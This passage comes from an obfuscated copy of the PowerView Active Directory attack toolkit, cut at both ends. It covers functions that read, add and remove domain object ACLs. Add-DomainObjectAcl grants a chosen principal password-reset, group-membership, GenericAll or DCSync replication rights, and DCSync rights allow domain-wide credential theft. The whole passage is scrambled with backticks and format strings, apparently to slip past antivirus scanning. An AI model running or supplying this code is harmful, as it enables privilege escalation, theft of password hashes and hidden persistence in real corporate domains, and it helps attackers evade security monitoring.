                        ${Iden`TIT`y`DOMaIN} = ${Id`EN`TI`TYInS`TAnCE}.("{2}{3}{1}{0}"-f 'ring','St','Su','b').Invoke(${iD`ENTiTyINs`TaN`cE}.("{0}{1}"-f 'I','ndexOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{0}{1}{3}{2}{4}"-f'Wri','te-V','s','erbo','e') ('['+'G'+'et-Doma'+'inOb'+'j'+'ec'+'tAcl] '+'E'+'xtract'+'ed '+'d'+'omai'+'n '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                        ${S`eaRc`heRA`RGUmENts}[("{0}{1}{2}" -f 'Dom','ai','n')] = ${iden`TI`TYDOM`Ain}
                        ${S`EaRc`hER} = &("{4}{0}{2}{3}{1}"-f'-D','cher','omainSe','ar','Get') @SearcherArguments
                        if (-not ${sear`c`HeR}) {
                            &("{2}{1}{3}{0}{4}" -f'a','ite','Wr','-W','rning') ('[Get-'+'Do'+'m'+'ainObje'+'ct'+'Ac'+'l] '+'Unabl'+'e '+'to'+' '+'retrie'+'v'+'e'+' '+'domai'+'n'+' '+'searc'+'h'+'er '+'f'+'or '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${i`DENtit`YI`NstAnce} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${g`Ui`DbytEsTR`I`Ng} = (([Guid]${iDeNT`Ity`iNs`T`An`Ce}).("{0}{1}{2}" -f'T','oByteArr','ay').Invoke() | &("{0}{2}{1}"-f'Fo','Object','rEach-') { '\' + ${_}.("{0}{1}"-f 'ToS','tring').Invoke('X2') }) -join ''
                    ${I`deNt`Ity`Filt`eR} += "(objectguid=$GuidByteString)"
                }
                elseif (${IdE`N`TiTyIn`S`TaNCE}.("{1}{2}{0}"-f's','Con','tain').Invoke('.')) {
                    ${i`DEN`TI`Ty`FiLTeR} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    ${identI`TyFiL`T`ER} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if (${IdEnt`i`TyFi`ltEr} -and (${IDE`NtITYFi`l`T`er}.("{1}{0}"-f 'im','Tr').Invoke() -ne '') ) {
                ${fI`LtEr} += "(|$IdentityFilter)"
            }

            if (${ps`BouNd`ParAm`EtERS}[("{1}{0}{2}"-f 'AP','LD','Filter')]) {
                &("{2}{1}{0}"-f'Verbose','rite-','W') ('[G'+'et-Domai'+'n'+'Objec'+'tAcl] '+'Using'+' '+'a'+'d'+'d'+'itional '+'LD'+'AP '+'filt'+'er'+': '+"$LDAPFilter")
                ${FIl`T`er} += "$LDAPFilter"
            }

            if (${f`iLtEr}) {
                ${sEARc`h`Er}."f`iLter" = "(&$Filter)"
            }
            &("{2}{0}{4}{1}{3}" -f'i','e','Wr','-Verbose','t') "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Searcher.filter) "

            ${r`e`sULts} = ${SEAR`C`hER}.("{0}{2}{1}" -f 'Fi','ll','ndA').Invoke()
            ${resU`lts} | &("{1}{0}{2}"-f 'ere-Objec','Wh','t') {${_}} | &("{0}{1}{2}{3}" -f 'F','o','r','Each-Object') {
                ${oBj`ecT} = ${_}."P`ROp`ERtiES"

                if (${obj`Ect}."obJ`EC`TSiD" -and ${oB`j`eCt}."Obj`eC`TsiD"[0]) {
                    ${OB`J`EctS`ID} = (&("{2}{0}{3}{1}" -f'w-','ect','Ne','Obj') ("{4}{2}{5}{1}{6}{3}{0}{7}" -f'ifi','pal.Securit','stem.Securit','ent','Sy','y.Princi','yId','er')(${oBJ`E`CT}."objEC`Tsid"[0],0))."V`Alue"
                }
                else {
                    ${Ob`j`ecT`sId} = ${nu`LL}
                }

                try {
                    &("{1}{2}{0}{3}"-f'je','New-O','b','ct') ("{9}{6}{8}{0}{5}{1}{3}{2}{11}{4}{7}{10}" -f 'c','ssContro','.RawS','l','urit','ce','u','yDescr','rity.A','Sec','iptor','ec') -ArgumentList ${OBJ`eCt}[("{5}{1}{2}{0}{4}{3}" -f 'i','s','ecur','criptor','tydes','nt')][0], 0 | &("{2}{4}{1}{3}{0}"-f 'ect','ch-O','F','bj','orEa') { if (${p`sbouN`d`paRa`m`ETeRS}[("{1}{0}"-f 'cl','Sa')]) {${_}."sYst`E`mACl"} else {${_}."DIsC`R`eT`iONarYacl"} } | &("{2}{1}{0}{3}" -f'Objec','orEach-','F','t') {
                        if (${pS`BoUnd`p`AR`AMEteRs}[("{1}{0}{2}{3}"-f'h','Rig','tsFi','lter')]) {
                            ${G`U`iDfILtER} = Switch (${riGh`TSFI`lteR}) {
                                ("{3}{0}{2}{1}" -f 'tPassw','rd','o','Rese') { ("{7}{0}{3}{2}{6}{8}{1}{5}{4}"-f'0299570-','-a768-00aa006','46','2','29','e05','d-11','0','d0') }
                                ("{2}{1}{0}"-f's','teMember','Wri') { ("{1}{5}{10}{0}{2}{3}{7}{4}{9}{8}{6}" -f'679','b','c0','-0d','a285-00','f','2','e6-11d0-','049e','aa003','9') }
                                ("{0}{2}{1}"-f 'De','ult','fa') { ("{0}{6}{2}{1}{3}{4}{5}" -f'0','0000-0000-0000-','00','0','000-00000000','0000','0') }
                            }
                            if (${_}."Objec`Tt`yPe" -eq ${gUi`D`FilT`er}) {
                                ${_} | &("{1}{2}{0}" -f'r','Add-M','embe') ("{2}{1}{0}"-f'perty','ro','NoteP') ("{0}{1}{2}" -f 'Obje','ct','DN') ${O`BJecT}."DiS`TinGUiS`hEd`NaME"[0]
                                ${_} | &("{2}{0}{1}" -f 'Membe','r','Add-') ("{1}{3}{2}{0}" -f 'ty','Not','Proper','e') ("{3}{2}{0}{1}"-f'tSI','D','bjec','O') ${obJEC`T`siD}
                                ${COnT`IN`Ue} = ${t`RUe}
                            }
                        }
                        else {
                            ${_} | &("{2}{1}{0}"-f'r','-Membe','Add') ("{0}{1}{2}"-f 'Note','Pro','perty') ("{2}{0}{1}"-f 'je','ctDN','Ob') ${Obj`e`ct}."dISTi`Ng`U`is`He`DNAME"[0]
                            ${_} | &("{0}{2}{3}{1}" -f'A','er','dd-','Memb') ("{1}{0}{3}{2}"-f't','No','ty','eProper') ("{2}{3}{0}{1}"-f 'I','D','O','bjectS') ${obJ`e`c`TsiD}
                            ${C`oNTi`Nue} = ${t`RUE}
                        }

                        if (${co`N`TinUE}) {
                            ${_} | &("{0}{1}{2}"-f'Add-Memb','e','r') ("{0}{2}{3}{1}" -f 'N','rty','ot','ePrope') ("{1}{0}{2}{4}{3}" -f'ctory','ActiveDire','R','ghts','i') ( ${c`JI6K1}::"tOoB`JeCt"([System.DirectoryServices.ActiveDirectoryRights], ${_}."a`C`c`esSmask"))
                            if (${G`Uids}) {

                                ${Acl`Pr`OPeRt`ies} = @{}
                                ${_}."p`s`ObJecT"."prOP`erTI`eS" | &("{1}{0}{3}{2}"-f 'o','F','ch-Object','rEa') {
                                    if (${_}."N`AmE" -match ((("{0}{11}{5}{15}{18}{6}{3}{17}{8}{14}{7}{4}{12}{10}{16}{13}{9}{2}{1}"-f 'Object','ype','AceT','nher','In','p','I','ObjectAceTypeEw7','bjectTypeEw','ct','rited','Ty','he','e','7','e','Obj','itedO','Ew7'))."r`e`pLACE"('Ew7',[strINg][ChAr]124))) {
                                        try {
                                            ${AcL`pro`peRties}[${_}."N`AMe"] = ${G`Ui`DS}[${_}."vaL`UE".("{0}{2}{1}"-f 'toStr','g','in').Invoke()]
                                        }
                                        catch {
                                            ${aClp`RO`P`e`RtIes}[${_}."n`AME"] = ${_}."v`AluE"
                                        }
                                    }
                                    else {
                                        ${aC`LpRo`pertIes}[${_}."N`AmE"] = ${_}."va`lUE"
                                    }
                                }
                                ${OU`TO`BJECT} = &("{0}{2}{1}"-f'New-Obj','t','ec') -TypeName ("{0}{1}{2}"-f'PS','Objec','t') -Property ${acl`PROp`e`RTi`ES}
                                ${o`U`To`BJEct}."pS`OBJECt"."tyP`eN`AmeS".("{0}{1}"-f'I','nsert').Invoke(0, ("{1}{0}{2}"-f 'owerVi','P','ew.ACL'))
                                ${oU`To`BjECt}
                            }
                            else {
                                ${_}."P`sObje`CT"."tyP`EN`AM`eS".("{0}{1}" -f'I','nsert').Invoke(0, ("{1}{2}{0}{3}" -f'V','Pow','er','iew.ACL'))
                                ${_}
                            }
                        }
                    }
                }
                catch {
                    &("{3}{1}{0}{2}" -f 'e-Ve','rit','rbose','W') ('[Get-Do'+'ma'+'inObjec'+'tAc'+'l] '+'Err'+'o'+'r: '+"$_")
                }
            }
        }
    }
}

function AdD-domAIN`Obj`e`CTacl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{4}{2}{3}{1}"-f 'PSS','s','ldProce','s','hou'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(POSiTiOn = 0, VaLUEfROmpipeLinE = ${t`RuE}, vAluEfrOMPipElIneByPrOPerTyname = ${tR`UE})]
        [Alias({"{0}{1}{2}{3}" -f 'Dis','tinguished','Nam','e'}, {"{1}{2}{0}" -f'me','SamAccoun','tNa'}, {"{1}{0}" -f 'ame','N'})]
        [String[]]
        ${t`AR`Ge`TiDEN`TItY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Ta`RG`ETD`om`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f'e','Filt','r'})]
        [String]
        ${tA`RG`etlD`ApFIlTEr},

        [ValidateNotNullOrEmpty()]
        [String]
        ${T`A`R`gE`Tsear`cHBasE},

        [Parameter(mAnDatorY = ${tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PRinc`Ip`AlI`de`Nt`Ity},

        [ValidateNotNullOrEmpty()]
        [String]
        ${PRInci`pa`l`d`OmaIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{4}{2}{3}{0}" -f 'r','Do','ntrol','le','mainCo'})]
        [String]
        ${SE`RV`eR},

        [ValidateSet({"{1}{0}"-f 'ase','B'}, {"{0}{1}"-f'O','neLevel'}, {"{0}{1}"-f'Subtre','e'})]
        [String]
        ${s`ea`RcHScope} = ("{0}{1}" -f'Su','btree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`esUlt`paGeSi`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Se`RveRt`imEl`i`MiT},

        [Switch]
        ${t`O`mbsTOne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`Eden`TiAL} =  ( &("{0}{2}{1}"-f 'vAri','BlE','a')  ("{1}{0}{2}" -f 'kf','p','eZN'))."Va`LUE"::"e`MpTY",

        [ValidateSet('All', {"{2}{0}{1}{3}"-f 'setPas','sw','Re','ord'}, {"{0}{1}{3}{2}" -f'Wri','teM','s','ember'}, {"{1}{0}" -f 'Sync','DC'})]
        [String]
        ${ri`G`HtS} = 'All',

        [Guid]
        ${RIg`htSg`UID}
    )

    BEGIN {
        ${taRGe`T`S`E`ArChERA`R`gUMents} = @{
            ("{2}{3}{0}{1}"-f'ert','ies','Pro','p') = ("{3}{4}{1}{0}{2}" -f'g','in','uishedname','d','ist')
            'Raw' = ${Tr`Ue}
        }
        if (${PSbou`ND`P`AraME`Ters}[("{0}{1}{2}"-f 'TargetDom','ai','n')]) { ${tar`G`EtseARc`he`Rar`G`Ume`NTs}[("{1}{0}"-f 'ain','Dom')] = ${Ta`RgetDo`MAIn} }
        if (${pSbOunDpA`R`A`MET`ers}[("{3}{1}{0}{2}" -f'e','argetLDAPFilt','r','T')]) { ${TARge`TS`EarcHe`RarGUME`N`TS}[("{2}{3}{1}{0}" -f 'er','t','LDA','PFil')] = ${t`ARgEtL`dA`PFIlteR} }
        if (${pSBOu`N`DpA`RamE`Ters}[("{2}{3}{0}{1}{4}" -f'g','etSearchBas','T','ar','e')]) { ${t`A`RgETS`eaRCh`Erar`G`UmeNTs}[("{1}{2}{0}" -f'ase','Sea','rchB')] = ${TAR`gETsea`R`cHba`Se} }
        if (${p`SBoU`NdPA`R`AME`Ters}[("{1}{0}"-f 'r','Serve')]) { ${T`Arg`e`T`seAR`CHe`RargUmeNTs}[("{0}{1}"-f'Ser','ver')] = ${SE`RV`ER} }
        if (${p`sboUn`DPaRAmE`TE`Rs}[("{2}{1}{0}{3}"-f'chScop','ar','Se','e')]) { ${taRgETS`EaRcHera`Rg`UMeN`TS}[("{1}{3}{0}{2}"-f 'c','Se','hScope','ar')] = ${S`eArCHsCO`pE} }
        if (${P`S`BOun`dparaMe`TErs}[("{3}{1}{0}{2}{4}"-f 'S','ltPage','i','Resu','ze')]) { ${tar`G`ET`SEar`CHE`RArGu`MEN`TS}[("{1}{0}{3}{2}"-f 'esultPag','R','ize','eS')] = ${rEs`UL`T`PaGEsiZe} }
        if (${P`SBo`UND`pa`RAmeT`Ers}[("{0}{3}{1}{2}{4}"-f 'Server','me','Lim','Ti','it')]) { ${t`A`Rge`TSEarCHErArGUM`entS}[("{1}{0}{3}{2}" -f'erverTim','S','it','eLim')] = ${S`erveR`T`ImElI`mIT} }
        if (${PSBO`U`NDPARaM`et`ERS}[("{0}{1}{2}" -f'T','omb','stone')]) { ${TA`Rge`TseA`RCHeRAR`Gu`M`eN`TS}[("{1}{0}" -f'tone','Tombs')] = ${TOmb`STO`Ne} }
        if (${pS`BO`UNDP`AramEters}[("{0}{1}{2}"-f'C','re','dential')]) { ${TAr`Ge`TsEaRC`HERArg`U`mEntS}[("{3}{0}{2}{1}"-f'ed','al','enti','Cr')] = ${c`ReD`EntiAL} }

        ${p`Rin`cI`P`Als`e`ArcheRArGumeNTS} = @{
            ("{1}{2}{0}"-f'tity','I','den') = ${pr`inciPALiden`T`itY}
            ("{2}{1}{0}"-f 'rties','e','Prop') = ("{0}{2}{5}{3}{1}{4}{6}" -f 'dist','name,','i','uished','obj','ng','ectsid')
        }
        if (${PsBouNDP`ArA`Me`TERS}[("{0}{3}{1}{2}"-f'Pr','o','main','incipalD')]) { ${PRinC`iP`Alsea`R`ch`eraRGUmen`TS}[("{0}{2}{1}" -f'Doma','n','i')] = ${PR`Inc`iPA`LDoMA`in} }
        if (${p`sb`ouNDPARa`meTERS}[("{1}{0}" -f'er','Serv')]) { ${PrIncI`palsEA`RCH`erAR`G`UMEnTS}[("{2}{1}{0}" -f 'er','erv','S')] = ${s`ERV`er} }
        if (${p`S`BoUN`dParaMe`TeRS}[("{3}{0}{1}{2}"-f 'rc','hSc','ope','Sea')]) { ${pR`iNcIpAlSeA`Rc`hERa`RGUMents}[("{0}{1}{2}{3}" -f'S','ear','c','hScope')] = ${S`eAR`ChSc`OPE} }
        if (${psBOUNDPa`RAMe`Te`Rs}[("{1}{2}{0}{3}" -f 'geSiz','ResultP','a','e')]) { ${priNCIpaLs`eAR`CHeRa`Rgu`MentS}[("{1}{2}{0}{3}"-f 'tPa','Re','sul','geSize')] = ${RE`SULT`PaG`esiZe} }
        if (${pS`BOUN`dpARA`meTers}[("{2}{1}{0}"-f 'mit','imeLi','ServerT')]) { ${Pr`INCiPaLsEa`Rch`e`RaR`GUmE`N`TS}[("{3}{2}{0}{1}"-f'eLimi','t','rverTim','Se')] = ${sE`Rv`ertImEli`MIT} }
        if (${p`SBoUnD`pA`RaME`T`ErS}[("{2}{1}{0}" -f 'stone','mb','To')]) { ${P`RIn`CIP`A`L`SeaRChE`RARGUmen`TS}[("{1}{3}{2}{0}" -f 'e','Tom','n','bsto')] = ${tombs`T`ONe} }
        if (${PSb`oun`dpARa`MeterS}[("{2}{1}{0}" -f'al','nti','Crede')]) { ${p`Ri`NCIp`AlSea`RCheRaRG`UMeNts}[("{2}{0}{1}" -f'eden','tial','Cr')] = ${cr`E`D`ENTIAl} }
        ${pRI`N`CIP`ALS} = &("{3}{1}{0}{2}{4}"-f'omainO','t-D','bj','Ge','ect') @PrincipalSearcherArguments
        if (-not ${pRIN`C`IpAlS}) {
            throw ('U'+'nable '+'to'+' '+'r'+'esolv'+'e '+'princip'+'a'+'l'+': '+"$PrincipalIdentity")
        }
    }

    PROCESS {
        ${taRgetS`e`Ar`CheRAR`gum`e`NtS}[("{1}{0}{2}"-f 'it','Ident','y')] = ${TAR`GET`iDen`T`itY}
        ${ta`RGE`Ts} = &("{2}{0}{4}{3}{1}"-f't-DomainOb','t','Ge','c','je') @TargetSearcherArguments

        ForEach (${taRgET`obJE`cT} in ${tA`R`gEts}) {

            ${IN`hEriTANcE`T`YPE} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ("{1}{0}"-f 'one','N')
            ${CoNTROl`T`ypE} = [System.Security.AccessControl.AccessControlType] ("{0}{1}" -f 'All','ow')
            ${a`cEs} = @()

            if (${RiGH`TS`Gu`iD}) {
                ${G`UidS} = @(${RIghtsG`U`iD})
            }
            else {
                ${gu`i`dS} = Switch (${RiG`H`TS}) {

                    ("{0}{4}{3}{2}{1}"-f'Re','d','Passwor','et','s') { ("{2}{0}{1}{4}{3}{5}{6}" -f '299570','-2','00','-11d0','46d','-a','768-00aa006e0529') }

                    ("{2}{1}{0}" -f 'iteMembers','r','W') { ("{6}{2}{0}{3}{5}{4}{1}" -f'0','5-00aa003049e2','9679c','-','1d0-a28','0de6-1','bf') }

                    ("{0}{1}"-f'D','CSync') { ("{1}{8}{0}{7}{10}{5}{9}{6}{4}{2}{3}"-f '-','1131f6aa-9c0','dc','d2','2','9','c04fc','f','7-11d1','f-00','7'), ("{4}{3}{1}{0}{8}{2}{7}{5}{6}" -f '-9c0','f6ad','11d1-f79f-','1','113','c','d2','00c04fc2d','7-'), ("{4}{5}{1}{2}{0}{3}"-f'cbeda64','-0f','a','0c','89e95b76-444d-4c62-99','1a')}
                }
            }

            ForEach (${p`RINc`i`PalObjECT} in ${PrincI`pA`ls}) {
                &("{2}{1}{0}"-f'ose','rite-Verb','W') "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) "

                try {
                    ${i`Den`TitY} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${priNc`IpALOb`J`E`Ct}."OBjE`CtS`id")

                    if (${G`UIdS}) {
                        ForEach (${g`UId} in ${gu`I`ds}) {
                            ${ne`wG`UId} = &("{1}{0}{3}{2}"-f'w-Obj','Ne','ct','e') ("{0}{1}"-f 'Gu','id') ${G`Uid}
                            ${A`DR`IghtS} = [System.DirectoryServices.ActiveDirectoryRights] ("{1}{0}{2}{3}" -f'xtendedR','E','ig','ht')
                            ${aC`eS} += &("{1}{0}{2}" -f'w-Obj','Ne','ect') ("{1}{5}{4}{2}{0}{3}{7}{6}{8}"-f 'Serv','System.Dir','ory','ices.Act','t','ec','toryAccessRul','iveDirec','e') ${I`de`NTI`Ty}, ${aDri`g`HtS}, ${CoNT`ROL`TY`PE}, ${NeWg`U`iD}, ${I`N`h`er`itancETYpe}
                        }
                    }
                    else {

                        ${AdR`igh`Ts} = [System.DirectoryServices.ActiveDirectoryRights] ("{2}{0}{1}" -f'e','nericAll','G')
                        ${a`CEs} += &("{0}{1}{2}" -f 'New-Obj','e','ct') ("{1}{10}{4}{0}{2}{9}{8}{7}{3}{5}{6}"-f'es.Act','System.Dire','ive','yAcc','ic','essR','ule','r','cto','Dire','ctoryServ') ${ID`E`NtITy}, ${ad`R`IGHTs}, ${c`ontrO`Lt`Ype}, ${Inh`er`itANceType}
                    }

                    ForEach (${A`CE} in ${Ac`es}) {
                        &("{2}{0}{4}{1}{3}"-f '-V','bo','Write','se','er') "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname) "
                        ${TAR`G`Ete`NTry} = ${TArgEto`BJ`e`cT}.("{1}{2}{3}{0}"-f 'ntry','GetD','irectory','E').Invoke()
                        ${tARGET`en`T`Ry}."PsBa`SE"."o`PTIONs"."s`E`CurITYM`A`Sks" = ("{1}{0}" -f'cl','Da')
                        ${taRGE`TeN`T`Ry}."PS`BasE"."O`BJEc`TsE`cuRiTY".("{1}{2}{0}"-f'le','AddAcces','sRu').Invoke(${A`ce})
                        ${Ta`R`gEtEntrY}."P`Sb`AsE".("{1}{0}{2}{3}" -f 'omm','C','itC','hanges').Invoke()
                    }
                }
                catch {
                    &("{2}{1}{0}"-f '-Verbose','e','Writ') "[Add-DomainObjectAcl] Error granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) : $_ "
                }
            }
        }
    }
}

function rEm`OVE`-d`OmaI`NobJe`c`TacL {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{4}{2}{1}"-f 'P','cess','dPro','S','Shoul'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(poSitioN = 0, VALuEfrOMpipeliNe = ${Tr`UE}, VALuEFroMPIPeLiNEbYprOpeRtYNAme = ${T`RUE})]
        [Alias({"{2}{1}{0}{3}" -f 'ing','ist','D','uishedName'}, {"{0}{2}{1}"-f 'SamAccoun','ame','tN'}, {"{0}{1}" -f 'Nam','e'})]
        [String[]]
        ${taR`G`ETI`deNtitY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${TARg`ETdom`A`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f'F','il','ter'})]
        [String]
        ${TaRGE`T`l`Dapf`iLter},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Ta`RGET`S`EARCh`Ba`sE},

        [Parameter(MAnDAToRY = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`RiNcIp`ALidEn`TIty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${P`R`inCip`A`LdOmAiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{4}{2}{3}" -f'D','o','in','Controller','ma'})]
        [String]
        ${SE`RV`Er},

        [ValidateSet({"{1}{0}"-f 'se','Ba'}, {"{0}{1}"-f 'OneLeve','l'}, {"{2}{0}{1}" -f 'ubtr','ee','S'})]
        [String]
        ${SearCH`s`Co`pE} = ("{2}{0}{1}" -f're','e','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${REsU`L`TPA`gESI`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SEr`VER`TImeli`M`IT},

        [Switch]
        ${TOMB`ST`OnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REdEnTI`Al} =  ( &("{1}{0}" -f'r','dI') ('VA'+'r'+'IablE'+':PkFEzN')  )."VaL`UE"::"e`mPTY",

        [ValidateSet('All', {"{1}{2}{0}{3}" -f 'etPa','R','es','ssword'}, {"{2}{1}{3}{0}" -f 's','t','Wri','eMember'}, {"{0}{1}" -f'D','CSync'})]
        [String]
        ${Ri`GhTS} = 'All',

        [Guid]
        ${Righ`Ts`gUId}
    )

    BEGIN {
        ${ta`RgetSE`ARchErA`R`gUM`e`NtS} = @{
            ("{1}{2}{0}"-f 'es','P','roperti') = ("{2}{3}{0}{1}"-f'hednam','e','di','stinguis')
            'Raw' = ${T`Rue}
        }
        if (${PSbOu`N`DpaRAMete`RS}[("{0}{1}{2}"-f 'Targ','etDom','ain')]) { ${tarGETSE`Ar`Ch`EraRgUM`Ents}[("{2}{0}{1}" -f 'i','n','Doma')] = ${TA`RGETDOMa`iN} }
        if (${PsbOU`N`dpArAMe`TERS}[("{3}{0}{2}{1}"-f 'tLDAPF','ter','il','Targe')]) { ${TARG`e`Ts`e`Arch`eRArGuMeN`Ts}[("{1}{2}{3}{0}" -f'er','LDAP','Fi','lt')] = ${tArg`etLD`A`PF`ilt`eR} }
        if (${Psb`oun`DPARAm`eters}[("{0}{3}{2}{1}{4}"-f 'Tar','hBas','rc','getSea','e')]) { ${TARGEt`seaRC`HeRARG`Um`E`NTs}[("{0}{2}{1}"-f'Searc','se','hBa')] = ${tARg`EtsEAr`C`Hb`A`SE} }
        if (${pSboun`d`p`A`RaMETErS}[("{0}{1}" -f'Serv','er')]) { ${TARGET`seARCHe`R`ArGu`MEn`TS}[("{1}{2}{0}" -f'r','Serv','e')] = ${sE`Rv`ER} }
        if (${Psb`ou`NdpA`RAMe`TERs}[("{1}{2}{0}" -f'pe','Sear','chSco')]) { ${T`ARG`eTSearcHer`Ar`gUmENTS}[("{2}{0}{1}"-f 'p','e','SearchSco')] = ${seAr`CH`ScopE} }
        if (${PS`Bou`NdPARamet`E`RS}[("{1}{2}{0}"-f 'ze','ResultPag','eSi')]) { ${tARg`eTseAr`CH`E`RArgUMe`N`Ts}[("{2}{3}{4}{1}{0}" -f'eSize','ag','Res','ul','tP')] = ${REs`ULt`PA`G`eSize} }
        if (${pS`B`o`UNd`parAmEtERs}[("{2}{1}{0}{3}"-f 'rTimeL','erve','S','imit')]) { ${taR`geTSea`R`ChERARgU`Me`N`Ts}[("{2}{1}{3}{0}" -f 'meLimit','rverT','Se','i')] = ${sEr`VErtiM`E`Li`m`IT} }
        if (${ps`B`oundP`AraM`EteRS}[("{0}{2}{3}{1}"-f 'Tomb','one','s','t')]) { ${TA`RGeTseAr`C`h`e`RaRGUMeNts}[("{2}{1}{0}"-f 'tone','s','Tomb')] = ${toM`B`sTonE} }
        if (${PsBoU`NdpaRa`me`T`E`Rs}[("{0}{2}{1}"-f 'Cre','l','dentia')]) { ${T`A`RgEtSeaR`cheRAr`G`U`MeNtS}[("{0}{1}{3}{2}" -f'C','redent','l','ia')] = ${crED`En`TiAL} }

        ${pR`iNciP`Als`e`A`R`ChErARG`UMeNTS} = @{
            ("{0}{1}{2}" -f 'I','de','ntity') = ${PRI`Ncip`AlIden`T`iTY}
            ("{0}{2}{1}" -f 'Pr','s','opertie') = ("{0}{1}{2}{5}{4}{3}" -f 'disting','ui','shed','objectsid','ame,','n')
        }
        if (${P`Sbo`U`NdpA`Ram`ETERs}[("{1}{3}{2}{0}{4}" -f'palDo','Pri','ci','n','main')]) { ${P`R`INcipALs`EarCH`erargUmeN`Ts}[("{1}{0}{2}" -f 'ma','Do','in')] = ${pRIN`c`i`paLdoMAIn} }
        if (${PS`B`ouNDpara`METErs}[("{0}{2}{1}"-f'Ser','er','v')]) { ${p`RincIpal`SEA`RchEr`ArG`UMentS}[("{0}{2}{1}"-f 'S','er','erv')] = ${Se`R`VEr} }
        if (${pSB`ouNDPa`R`AM`etErS}[("{1}{2}{3}{0}"-f 'Scope','Sea','r','ch')]) { ${pRinCI`Pa`LS`EarCH`E`RaR`gUMeN`TS}[("{0}{1}{2}"-f'Search','Sco','pe')] = ${sEArC`Hs`cO`PE} }
        if (${Psb`O`U`NDPar`AmeTeRS}[("{3}{1}{2}{4}{0}"-f'e','esul','t','R','PageSiz')]) { ${PR`inC`IpalsE`Archer`ArgU`mEnts}[("{0}{2}{1}" -f 'Resu','PageSize','lt')] = ${r`Esu`l`Tp`AgEsizE} }
        if (${psb`o`Un`dPAraMet`eRS}[("{0}{2}{1}"-f'ServerTi','it','meLim')]) { ${pRIn`cipaLs`Ea`RCHeR`A`RgumentS}[("{3}{1}{2}{0}{4}"-f'Ti','e','rver','S','meLimit')] = ${s`E`Rv`eRTIMELimIT} }
        if (${psBou`ND`p`A`RaMe`Ters}[("{0}{1}{2}" -f 'Tomb','ston','e')]) { ${pRI`N`CiPA`L`S`eaRCheRaRGUme`NtS}[("{2}{3}{1}{0}" -f 'one','mbst','T','o')] = ${Tom`B`sTOnE} }
        if (${Ps`BO`U`NdpAraMEtE`RS}[("{0}{3}{1}{2}"-f 'C','e','ntial','red')]) { ${P`Ri`NCIPAlSEA`R`CHeraRgumEnTS}[("{2}{1}{0}{3}"-f'tia','en','Cred','l')] = ${c`R`EdeNtIAL} }
        ${Prin`c`iPals} = &("{1}{0}{2}{3}"-f 'e','G','t-DomainObj','ect') @PrincipalSearcherArguments
        if (-not ${pR`InCiP`A`LS}) {
            throw ('Unab'+'le '+'to'+' '+'r'+'esolve '+'pri'+'ncip'+'a'+'l: '+"$PrincipalIdentity")
        }
    }

    PROCESS {
        ${T`Ar`Ge`TseA`R`chErARG`UmE`Nts}[("{0}{2}{1}" -f 'Ide','ity','nt')] = ${tar`G`eTI`dentI`Ty}
        ${targE`TS} = &("{0}{3}{1}{2}" -f 'G','ma','inObject','et-Do') @TargetSearcherArguments

        ForEach (${ta`RGeT`OBJE`ct} in ${TArG`e`Ts}) {

            ${iN`HEriT`AN`ceTypE} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ("{0}{1}"-f'Non','e')
            ${contR`oLt`yPE} = [System.Security.AccessControl.AccessControlType] ("{1}{0}" -f'w','Allo')
            ${A`cES} = @()

            if (${R`iG`HT`SGuId}) {
                ${g`UIDS} = @(${rIG`ht`sG`UId})
            }
            else {
                ${gu`ids} = Switch (${riGH`TS}) {

                    ("{2}{0}{1}" -f 'setPas','sword','Re') { ("{3}{4}{7}{5}{2}{6}{0}{1}" -f '68-00aa','006e0529','a','0029957','0','d0-','7','-246d-11') }

                    ("{3}{0}{1}{2}" -f 'r','iteMem','bers','W') { ("{6}{5}{4}{3}{10}{9}{1}{8}{7}{0}{2}"-f'3049','28','e2','0','6-11d','f9679c0-0de','b','aa00','5-00','a','-') }

                    ("{1}{0}"-f'Sync','DC') { ("{8}{4}{5}{0}{6}{3}{9}{1}{2}{7}"-f 'f6aa-','9f-0','0','-','13','1','9c07','c04fc2dcd2','1','11d1-f7'), ("{0}{5}{6}{2}{4}{1}{3}{8}{7}"-f'11','f','9c07-1','79f-00c','1d1-','31f6','ad-','c2dcd2','04f'), ("{1}{2}{3}{7}{0}{5}{4}{6}{9}{8}" -f '0','89e95b76-444d-4c','62-','991','acb','f','eda6','a-','c','40')}
                }
